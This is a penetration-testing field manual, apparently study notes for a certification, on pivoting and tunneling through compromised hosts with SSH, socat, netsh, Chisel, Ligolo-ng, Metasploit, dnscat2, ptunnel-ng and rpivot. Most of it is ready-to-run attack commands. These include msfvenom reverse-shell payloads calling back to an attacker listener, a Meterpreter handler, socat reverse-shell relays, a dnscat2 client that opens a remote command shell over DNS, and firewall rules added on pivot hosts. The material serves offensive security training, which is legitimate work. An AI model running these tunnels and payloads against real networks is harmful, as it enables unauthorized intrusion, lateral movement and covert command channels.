---
title: "Pivoting and Tunneling"
description: "Local, dynamic, and reverse port forwarding; SOCKS proxies; chisel, ligolo, sshuttle, and DNS/HTTP tunnels."
category: "Field Manual"
tags: ["field-manual", "cpts", "pivoting", "tunneling", "chisel", "ligolo"]
date: 2026-11-11
published: true
status: archive
---

# Pivoting and Tunneling

## Concepts

| Type | Direction | Example |
|---|---|---|
| Local forward | Local port → remote host:port | `ssh -L 8080:internal:80` |
| Remote forward | Remote port → local host:port | `ssh -R 4444:127.0.0.1:4444` |
| Dynamic forward | SOCKS proxy | `ssh -D 1080` |
| Reverse tunnel | Target connects out | `chisel client ... R:socks` |

### Working topology

| Role | Address | Meaning in the examples |
|---|---|---|
| Attacker | `10.10.14.5` | Runs local tools, listeners, and reverse-tunnel servers |
| Pivot, external interface | `10.129.1.20` | Initial reachable host / SSH server |
| Pivot, internal interface | `172.16.5.129` | Reachable from the internal segment |
| Internal application host | `172.16.5.20` | HTTP, SSH, or database destination |
| Internal RDP host | `172.16.5.25` | TCP/3389 destination |

Decide which host owns the listening port and which host opens the final connection. `127.0.0.1` refers to that endpoint's loopback, not automatically to the attacker.

## SSH

```bash
# Local port forward
ssh -L 8080:10.10.20.10:80 user@$JUMP

# Remote port forward
ssh -R 4444:127.0.0.1:4444 user@$JUMP

# SOCKS proxy
ssh -D 1080 -N -f user@$JUMP

# Jump host chain
ssh -J user@$JUMP user@10.10.20.10
```

`proxychains` configuration:

```ini
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
proxychains nmap -sT -Pn -p 22,80,139,445,3389 10.10.20.0/24
proxychains nxc smb 10.10.20.10 -u user -p pass
```

Nmap through a SOCKS proxy must use `-sT` (connect scan); raw packets do not traverse SOCKS.

### Local forwards and multiple destinations

Run on the attacker. The first forward reaches MySQL on the pivot's loopback; the second reaches an internal web server through the pivot:

```bash
ssh -N -o ExitOnForwardFailure=yes -L 127.0.0.1:1234:127.0.0.1:3306 -L 127.0.0.1:8080:172.16.5.20:80 user@10.129.1.20
```

In another attacker terminal:

```bash
ss -lntp 'sport = :1234'
nmap -sT -Pn -sV -p 1234 127.0.0.1
curl --max-time 10 http://127.0.0.1:8080/
```

Repeat `-L` for each mapping; two mappings following only one `-L` do not define two forwards. The destination after each `-L` is contacted from the SSH server.

### Reverse forward when the pivot connects out

Run on the pivot, connecting to an SSH server on the attacker:

```bash
ssh -N -o ExitOnForwardFailure=yes -R 127.0.0.1:13306:172.16.5.20:3306 user@10.10.14.5
```

The attacker connects to its own TCP/13306; the pivot opens the final connection to `172.16.5.20:3306`. This is useful when inbound SSH to the pivot is unavailable.

### Publish an attacker listener on the internal interface

For an internal host that can reach only the pivot, run on the attacker:

```bash
python3 -m http.server 8000 --bind 127.0.0.1
```

In another attacker terminal, place the remote listener on the pivot:

```bash
ssh -N -o ExitOnForwardFailure=yes -R 172.16.5.129:8080:127.0.0.1:8000 user@10.129.1.20
```

From an internal host:

```bash
curl --max-time 10 http://172.16.5.129:8080/
```

Here the SSH server is the pivot, so it owns TCP/8080; the SSH client opens `127.0.0.1:8000` on the attacker. A non-loopback remote bind normally requires `GatewayPorts clientspecified` (or an appropriate equivalent) on that SSH server, plus forwarding permission and a reachable firewall rule.

On the SSH server, inspect the effective policy:

```bash
sudo sshd -T | grep -E '^(allowtcpforwarding|gatewayports|permitopen|permitlisten)'
```

### Dynamic SOCKS and jump hosts

```bash
ssh -N -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -D 127.0.0.1:9050 user@10.129.1.20
ssh -J user@10.129.1.20 user@172.16.5.20
```

Create a dedicated Proxychains configuration on the attacker; its SOCKS version and port must match the tunnel:

```bash
cat > proxychains-pivot.conf <<'CONF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 9050
CONF
proxychains -f ./proxychains-pivot.conf curl --max-time 10 http://172.16.5.20/
proxychains -f ./proxychains-pivot.conf nmap -sT -Pn -n -p 22,80,445,3389 172.16.5.20
proxychains -f ./proxychains-pivot.conf xfreerdp /v:172.16.5.25 /u:user
proxychains -f ./proxychains-pivot.conf msfconsole
```

`-Pn` skips host discovery, `-n` skips Nmap DNS lookups, and `-sT` uses TCP connect calls that Proxychains can intercept. `nmap -sn` skips port scanning, not ping discovery, and is not a reliable SOCKS host-discovery method. Proxychains only intercepts compatible dynamically linked client calls; it does not make raw packets or every child process tunnel-aware.

## sshuttle

Transparent VPN over SSH (root required locally):

```bash
sshuttle -r user@$JUMP 10.10.20.0/24
```

Then use normal tools without proxychains.

For the working topology, route the complete internal CIDR and exclude the SSH transport endpoint:

```bash
sudo sshuttle -r user@10.129.1.20 172.16.5.0/24 -x 10.129.1.20 --dns -v
```

SSH access and a supported Python interpreter on the pivot are required. Local privileges install the interception rules. This is transparent forwarding for supported traffic, commonly TCP and DNS; it is not a general raw-IP VPN, and UDP support depends on the selected backend.

## socat

```bash
# Local forward
socat TCP-LISTEN:8080,fork TCP:10.10.20.10:80

# Reverse shell relay
socat TCP-LISTEN:4444,fork TCP:127.0.0.1:4444
```

### Pivot-side relay with distinct endpoints

Run on the pivot to expose the internal RDP service to the attacker:

```bash
socat TCP4-LISTEN:13389,bind=10.129.1.20,reuseaddr,fork TCP4:172.16.5.25:3389
```

Connect from the attacker:

```bash
xfreerdp /v:10.129.1.20:13389 /u:user
```

For the opposite direction, expose the attacker's HTTP listener to internal hosts:

```bash
socat TCP4-LISTEN:8080,bind=172.16.5.129,reuseaddr,fork TCP4:10.10.14.5:8000
```

Or relay an internal callback to an attacker listener on TCP/4444:

```bash
socat TCP4-LISTEN:4444,bind=172.16.5.129,reuseaddr,fork TCP4:10.10.14.5:4444
```

`fork` accepts successive clients and `reuseaddr` helps rebind after a restart. A relay targeting its own listening address/port loops back into itself; the earlier loopback shorthand requires a genuinely separate destination. Socat's TCP relay adds neither authentication nor encryption by itself.

## Windows port forwarding

### netsh portproxy

In an elevated CMD on the Windows pivot, forward an external listener to internal RDP and add a narrowly scoped inbound rule:

```cmd
netsh interface portproxy add v4tov4 listenaddress=10.129.1.20 listenport=13389 connectaddress=172.16.5.25 connectport=3389 protocol=tcp
netsh advfirewall firewall add rule name="FieldManual-RDP-13389" dir=in action=allow protocol=TCP localip=10.129.1.20 localport=13389 remoteip=10.10.14.5
netsh interface portproxy show v4tov4
sc query iphlpsvc
netstat -ano | findstr ":13389"
```

The attacker connects to `10.129.1.20:13389`. Portproxy is TCP-only, uses the IP Helper service, and persists beyond the creating shell. Remove the specific mapping and its firewall rule when finished:

```cmd
netsh interface portproxy delete v4tov4 listenaddress=10.129.1.20 listenport=13389
netsh advfirewall firewall delete rule name="FieldManual-RDP-13389"
```

### Plink from a Windows client

```cmd
plink.exe -ssh -N -D 127.0.0.1:9050 user@10.129.1.20
plink.exe -ssh -N -L 127.0.0.1:13389:172.16.5.25:3389 user@10.129.1.20
```

Verify the SSH host key at first connection. Configure a SOCKS-aware Windows application or Proxifier to use `127.0.0.1:9050`; the proxy exists on the machine running Plink.

## Chisel

Server on the attacker:

```bash
chisel server -p 8080 --reverse
```

Client on the pivot:

```bash
chisel client 10.10.14.5:8080 R:socks
chisel client 10.10.14.5:8080 R:3306:10.10.20.10:3306
chisel client 10.10.14.5:8080 R:8080:127.0.0.1:80
```

`R:socks` creates a SOCKS proxy on the attacker's `127.0.0.1:1080` by default. Combine with proxychains.

Check the actual bind with `ss -lntp`: unqualified mappings can listen on all interfaces depending on the implementation/version. The explicit loopback mappings below avoid relying on that default.

### Normal SOCKS: attacker connects to the pivot

On the pivot:

```bash
chisel server -v -p 1234 --socks5
```

On the attacker, expose SOCKS on the port used in `proxychains-pivot.conf`:

```bash
chisel client -v 10.129.1.20:1234 127.0.0.1:9050:socks
```

### Reverse SOCKS: pivot connects to the attacker

On the attacker:

```bash
chisel server -p 8080 --reverse
```

On the pivot, choose a SOCKS proxy or a single service mapping:

```bash
chisel client 10.10.14.5:8080 R:127.0.0.1:9050:socks
chisel client 10.10.14.5:8080 R:127.0.0.1:13306:172.16.5.20:3306
```

`R:` makes the Chisel server own the listening port and the client open the destination connection. Normal mappings do the opposite. Explicit binds remove ambiguity about exposure; use only one tunnel on a given local port. Chisel's `--fingerprint` can pin the server key reported at startup.

## Ligolo-ng

### Prepare a Linux TUN interface

For versions expecting a pre-created interface, run on the attacker before starting the proxy:

```bash
sudo ip tuntap add user "$(id -un)" mode tun ligolo
sudo ip link set ligolo up
ip route
```

Check whether the interface already exists before creating it. Some newer releases can manage interfaces in the proxy console instead. The example below uses the manual interface named `ligolo`.

Proxy on the attacker:

```bash
ligolo-proxy -selfcert
```

Agent on the pivot:

```bash
ligolo-agent -connect 10.10.14.5:11601 -ignore-cert
```

In the proxy console:

```text
session
ifconfig
start
```

Add a route on the attacker:

```bash
sudo ip route add 10.10.20.0/24 dev ligolo
```

Ligolo creates a TUN interface, so normal tools (including Nmap SYN scans) work without proxychains.

### Route the internal network and agent loopback

Select the connected agent with `session`, inspect its interfaces, and start the tunnel. In versions exposing explicit tunnel commands, use the proxy console:

```cmd
session
ifconfig
tunnel_start --tun ligolo
```

`start` in the earlier example is the older/alias form; use the commands supported by the installed version. On the attacker:

```bash
sudo ip route add 172.16.5.0/24 dev ligolo
ip route get 172.16.5.20
nmap -sT -Pn -n -p 22,80,445,3389 172.16.5.20
```

Ligolo translates traffic through a user-space stack on the agent. A tool can operate without SOCKS wrapping, but SYN handling and OS fingerprinting are not identical to a native raw-packet path; TCP connect scanning is a useful baseline.

To reach a service bound to the agent's loopback, Ligolo-ng supports the special `240.0.0.1` address:

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
curl --max-time 10 http://240.0.0.1:80/
```

### Reverse listener through the agent

With the agent selected, a listener can expose the attacker's local HTTP server to the internal segment:

```cmd
listener_add --addr 172.16.5.129:8080 --to 127.0.0.1:8000 --tcp
listener_list
```

Internal clients use `172.16.5.129:8080`; the proxy connects to `127.0.0.1:8000` on the attacker. Record the returned listener ID for `listener_stop --id ID`. The initial `-ignore-cert` flag bypasses identity checking for a self-signed lab setup; use certificate/fingerprint validation when supported.

## Metasploit

```text
route add 10.10.20.0 255.255.255.0 <session>
autoroute -s 10.10.20.0/24
socks5 1080
```

Meterpreter:

```text
portfwd add -l 8080 -p 80 -r 10.10.20.10
```

### Autoroute and a usable SOCKS server

Background the Meterpreter session, then use its actual session number (`1` here) in the existing `msfconsole`:

```cmd
background
```

```cmd
use post/multi/manage/autoroute
set SESSION 1
set CMD add
set SUBNET 172.16.5.0
set NETMASK 255.255.255.0
run
route print
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 9050
set VERSION 5
run -j
jobs
```

The earlier `autoroute` / `socks5` lines are shorthand concepts; the modules above create the route and server on current Metasploit versions. Routes apply to Metasploit's networking, not the attacker's operating-system route table. Use the SOCKS listener and matching Proxychains configuration for external clients.

A manual alternative to the autoroute module is:

```cmd
route add 172.16.5.0 255.255.255.0 1
route print
```

With the route installed, Metasploit's RDP scanner can use it directly:

```cmd
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 172.16.5.25
run
```

### Meterpreter local and reverse portfwd

Inside the selected Meterpreter session:

```cmd
help portfwd
portfwd add -L 127.0.0.1 -l 3300 -p 3389 -r 172.16.5.25
portfwd list
```

On the attacker:

```bash
xfreerdp /v:127.0.0.1:3300 /u:user
```

For a reverse listener, run inside Meterpreter:

```cmd
portfwd add -R -l 8081 -p 1234 -L 10.10.14.5
```

With `-R`, the pivot listens on TCP/1234 (`-p`), then sends connections to the attacker's `10.10.14.5:8081` (`-L` and `-l`). Without `-R`, `-l` is the local listening port and `-r`/`-p` identify the remote destination.

### Callback endpoint alignment

For that reverse mapping, a payload on an internal host calls the pivot's internal address, not the attacker's VPN address. Generate the selected platform's payload on the attacker:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f elf -o callback.elf
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=1234 -f exe -o callback.exe
```

For the Linux example, configure the handler in `msfconsole` with separate advertised and actual listening endpoints:

```cmd
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.129
set LPORT 1234
set ReverseListenerBindAddress 10.10.14.5
set ReverseListenerBindPort 8081
run -j
```

Use the matching Windows payload type for the HTTPS example. The route is `internal host → 172.16.5.129:1234 → 10.10.14.5:8081`; one handler/protocol should own the listener at a time. Transfer the selected file using [File Transfer](../04-post-exploitation/file-transfer.md).

## DNS tunneling

When only DNS egress is allowed:

```bash
iodine -f -P password t1.example.com
dnscat2-server t1.example.com
```

Requires a domain you control and an authoritative DNS server. Slow but resilient.

### dnscat2 with a PowerShell client

On the attacker, from the dnscat2 server directory:

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.5,port=53,domain=t1.example.com --no-cache
```

On the Windows pivot, import the staged client and enter the secret displayed by the server:

```powershell
Import-Module .\dnscat2.ps1
$secret = Read-Host 'Server pre-shared secret' -AsSecureString
$PSK = [Net.NetworkCredential]::new('', $secret).Password
Start-Dnscat2 -DNSserver 10.10.14.5 -Domain t1.example.com -PreSharedSecret $PSK -Exec cmd
```

In the dnscat2 server console:

```cmd
?
window -i 1
```

Use the actual session ID. An explicit `-DNSserver` needs direct reachability to that server's DNS port; tunneling through recursive resolvers instead requires correctly delegated DNS infrastructure. A dnscat2 command session is not automatically a system-wide IP route.

## ICMP tunnel with ptunnel-ng

On a Linux pivot with the tool and raw-socket privileges:

```bash
sudo ./ptunnel-ng -r10.129.1.20 -R22
```

On the attacker, encapsulate a connection to the pivot's SSH service over the ICMP tunnel:

```bash
sudo ./ptunnel-ng -p10.129.1.20 -l2222 -r10.129.1.20 -R22
```

In another attacker terminal, use the forwarded SSH port or build SOCKS on top of it:

```bash
ssh -p 2222 user@127.0.0.1
ssh -p 2222 -N -D 127.0.0.1:9050 user@127.0.0.1
```

The first hop requires usable ICMP in both directions; SSH still authenticates to the pivot. Verify the forwarded SSH host key against the pivot's known identity. The local TCP/2222 endpoint is a single service forward, not an ICMP route for arbitrary tools.

## HTTP tunneling

- `chisel` over HTTP/WebSocket.
- `ligolo-ng` with TLS.
- `reGeorg`/`neo-reGeorg` for web shells with SOCKS.
- `ABPTTS` for ASP.NET.

### Legacy rpivot and an NTLM-authenticated HTTP proxy

For an existing Python 2 rpivot environment, run the server on the attacker:

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Transfer the directory if needed, then run the client on the pivot:

```bash
scp -r rpivot user@10.129.1.20:~/
```

```bash
python2.7 client.py --server-ip 10.10.14.5 --server-port 9999
```

For an authenticated egress proxy reachable at `172.16.5.10:8081`, the client can use the proxy credentials:

```bash
read -rs -p 'Proxy password: ' PROXY_PASS
python2.7 client.py --server-ip 10.10.14.5 --server-port 9999 --ntlm-proxy-ip 172.16.5.10 --ntlm-proxy-port 8081 --domain LAB --username user --password "$PROXY_PASS"
```

Use a separate SOCKS4 configuration for the usual rpivot server setup:

```bash
printf 'strict_chain\n[ProxyList]\nsocks4 127.0.0.1 9050\n' > proxychains-rpivot.conf
proxychains -f ./proxychains-rpivot.conf curl --max-time 10 http://172.16.5.20/
```

rpivot is a legacy Python 2 option; its dependencies and proxy protocol differ from Chisel. Confirm the active listener rather than reusing a SOCKS5 entry without checking.

## SOCKS over an RDP virtual channel

On the Windows machine running the RDP client, register the matching SocksOverRDP plugin and start the RDP connection:

```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
mstsc.exe /v:10.129.1.20
```

Inside that RDP session on the pivot:

```cmd
SocksOverRDP-Server.exe
```

Back on the RDP client machine:

```cmd
netstat -antb | findstr 1080
```

The client-side SOCKS listener is normally `127.0.0.1:1080`; point a SOCKS-aware application or Proxifier at that listener. Plugin/client architecture and allowed RDP virtual channels must match. Registration alone does not create a working path without the remote server and an active RDP session.

## Pivoting reconnaissance

```bash
proxychains nmap -sT -Pn -n -p 21,22,25,53,80,88,139,443,445,1433,2049,3306,3389,5985 10.10.20.0/24
proxychains nxc smb 10.10.20.0/24
proxychains curl -s http://10.10.20.10/
```

Map:

- New subnets and routes.
- Hosts with multiple interfaces.
- Internal DNS suffixes.
- Reachable domain controllers.
- Services not exposed externally.

### Inspect the pivot's interfaces and listeners

On Linux:

```bash
ip -br addr
ip route
netstat -r
ss -lntp
```

On Windows:

```cmd
ipconfig /all
route print
netstat -ano | findstr LISTENING
```

### Native discovery from the pivot

Run ping discovery on the pivot itself, not through a SOCKS wrapper. These examples cover a small initial range; extend only to the intended segment:

```bash
for i in {1..20}; do ping -c 1 -W 1 "172.16.5.$i" | grep 'bytes from'; done
```

```cmd
for /L %i in (1 1 20) do @ping 172.16.5.%i -n 1 -w 100 | find "TTL="
```

```powershell
1..20 | ForEach-Object { $address = "172.16.5.$_"; if (Test-Connection -ComputerName $address -Count 1 -Quiet) { $address } }
```

Use `%%i` instead of `%i` in a `.bat` file. No ICMP reply does not imply the host is down; test known TCP services through the selected path.

From the existing Metasploit console with a pivot session:

```cmd
use post/multi/gather/ping_sweep
set SESSION 1
set RHOSTS 172.16.5.0/24
run
```

### Transport limitations

| Path | Practical capability | Typical failure |
|---|---|---|
| SSH `-L` / `-R`, socat TCP, netsh portproxy | A selected TCP service | Wrong bind side, listener loop, or firewall |
| SSH `-D`, Chisel SOCKS, Metasploit SOCKS | TCP proxy for compatible clients | SOCKS version/port mismatch; raw scans or UDP bypass the proxy |
| sshuttle | Transparent forwarding for supported backend traffic | Missing pivot Python or traffic type unsupported by the backend |
| Ligolo-ng | TUN-routed traffic translated by the agent | Missing interface/route, overlapping subnet, or agent not selected/started |
| dnscat2 / ptunnel-ng | DNS command channel / TCP encapsulated over ICMP | DNS delegation, raw-socket privileges, or filtered tunnel traffic |
| SocksOverRDP | SOCKS carried over an active RDP channel | Missing plugin/server or blocked virtual channel |

## Pitfalls

- Proxychains + Nmap `-sS` fails; use `-sT`.
- DNS leaks outside the tunnel; use `proxychains` with DNS settings or resolve manually.
- Chisel/ligolo may be blocked by egress filtering; test multiple ports/protocols.
- Tunnels die with the parent shell; use `nohup`/`tmux`/services.
- Routing conflicts: check `ip route` before adding a TUN route.

## Cleanup

- Kill tunnels and remove routes.
- Remove uploaded binaries.
- Restore firewall/proxy settings.
- Document every pivot and internal host.

Check the exact entries before removing them. For the manually created Ligolo example:

```bash
ip route show dev ligolo
sudo ip route del 172.16.5.0/24 dev ligolo
sudo ip route del 240.0.0.1/32 dev ligolo
sudo ip link set ligolo down
sudo ip tuntap del dev ligolo mode tun
```

Also stop the corresponding proxy/agent and any Ligolo reverse listener. For Metasploit, inspect `jobs`, `route print`, and Meterpreter `portfwd list`; stop/remove the entries belonging to this pivot. The netsh section includes its persistent mapping and firewall-rule cleanup.

## References

- [Chisel](https://github.com/jpillora/chisel)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [sshuttle](https://github.com/sshuttle/sshuttle)
- [HackTricks — Pivoting](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pivoting.html)
- [rpivot](https://github.com/klsecservices/rpivot)
- [dnscat2](https://github.com/iagox86/dnscat2)
- [dnscat2 PowerShell client](https://github.com/lukebaggett/dnscat2-powershell)
- [ptunnel-ng](https://github.com/utoni/ptunnel-ng)
- [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP)
- CPTS reference: `cheatsheet/Pivoting Tunneling Port Forwarding.md`; topology, endpoint direction, SOCKS versions, repeated SSH forwarding flags, and discovery syntax normalized for these examples.
